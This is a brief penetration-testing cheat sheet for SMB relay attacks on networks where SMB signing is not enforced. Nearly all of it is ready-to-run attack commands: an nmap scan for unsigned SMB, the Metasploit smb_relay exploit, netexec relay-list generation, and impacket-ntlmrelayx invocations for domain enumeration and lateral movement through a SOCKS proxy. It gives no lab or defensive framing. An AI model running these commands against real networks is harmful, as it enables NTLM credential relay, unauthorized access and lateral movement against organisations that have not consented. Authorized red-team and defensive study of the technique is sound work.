# SMB Relay

### Works on unsigned SMB

## Tools: Metasploit , nmap , CrackMapExec/Netexec , impacket-ntlmrelayx

### Check for unsigned SMB first!

    nmap -Pn -sS -T4 --open --script smb-security-mode -p 445 IP_ADDRESS/MASK

    use exploit/windows/smb/smb_relay (Metasploit)

    netexec smb 4hosts --gen-relay-list RELAY.TXT

### Find Users

    impacket-ntlmrelayx -tf TARGETS.TXT -smb2support (-6) --enum-domain

### Lateral Movement (SOCKS)

    impacket-ntlmrelayx -tf TARGETS.TXT -smb2support -socks (-6)
